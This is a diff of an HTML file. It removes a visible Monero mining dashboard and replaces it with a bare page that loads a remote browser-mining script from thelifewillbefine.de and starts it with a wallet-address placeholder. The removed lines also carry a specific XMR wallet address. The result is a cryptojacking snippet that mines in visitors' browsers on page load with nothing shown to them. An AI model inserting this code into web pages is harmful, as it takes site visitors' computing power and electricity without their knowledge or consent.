@@ -7,55 +7,11 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <header>
-        <h1>Monero Mining Dashboard</h1>
-    </header>
 
-    <main>
-        <section id="mining-stats">
-            <h2>Mining Statistics</h2>
-            <p><strong>Hashrate:</strong> <span id="hash-rate">0</span> H/s</p>
-            <p><strong>Total Hashes:</strong> <span id="total-hashes">0</span></p>
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy; 2024 Monero Mining. All rights reserved.</p>
-    </footer>
-
-    <!-- Script -->
-    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <script>
-        let isMining = true;
-        let totalHashes = 0;
-
-        // Инициализация EverythingIsLife
-        try {
-            EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
-            console.log('EverythingIsLife initialized.');
-        } catch (error) {
-            console.error('Failed to initialize EverythingIsLife:', error);
-        }
-
-        // Элементы интерфейса
-        const hashRateDisplay = document.getElementById('hash-rate');
-        const totalHashesDisplay = document.getElementById('total-hashes');
-
-        // Обновление хешрейта
-        function updateStats() {
-            if (isMining && typeof EverythingIsLife.getHashRate === 'function') {
-                const hashRate = EverythingIsLife.getHashRate();
-                totalHashes += hashRate; // Прибавляем к общей сумме
-                hashRateDisplay.innerText = hashRate.toFixed(2);
-                totalHashesDisplay.innerText = totalHashes.toFixed(0);
-            } else if (!isMining) {
-                hashRateDisplay.innerText = "0";
-            }
-        }
-
-        // Интервал обновления
-        setInterval(updateStats, 1000);
-    </script>
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('replace_with_your_xmr_address', 'x', 30);
+</script>
 </body>
 </html>
 
